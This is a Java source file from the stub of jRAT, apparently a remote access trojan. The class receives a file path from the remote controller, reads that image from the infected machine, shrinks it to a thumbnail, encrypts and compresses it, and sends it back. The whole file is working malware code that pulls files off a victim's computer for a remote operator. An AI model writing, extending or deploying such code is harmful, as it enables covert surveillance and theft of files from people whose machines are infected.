package io.jrat.stub.packets.incoming;

import io.jrat.common.compress.GZip;
import io.jrat.common.crypto.Crypto;
import io.jrat.stub.Connection;
import io.jrat.stub.Main;
import io.jrat.stub.packets.outgoing.Packet59ThumbnailPreview;
import io.jrat.stub.utils.ImageUtils;

import java.awt.image.BufferedImage;
import java.io.File;

import javax.imageio.ImageIO;


public class Packet85ThumbnailPreview extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		String file = Connection.readLine();

		Connection.addToSendQueue(new Packet59ThumbnailPreview(file));

		BufferedImage screenShot = ImageIO.read(new File(file));
		screenShot = ImageUtils.resize(screenShot, 150, 100);
		byte[] buffer = ImageUtils.encode(screenShot);
		buffer = GZip.compress(Crypto.encrypt(buffer, Main.getKey()));
		Connection.dos.writeInt(buffer.length);
		Connection.dos.write(buffer);

		Connection.lock();
	}

}
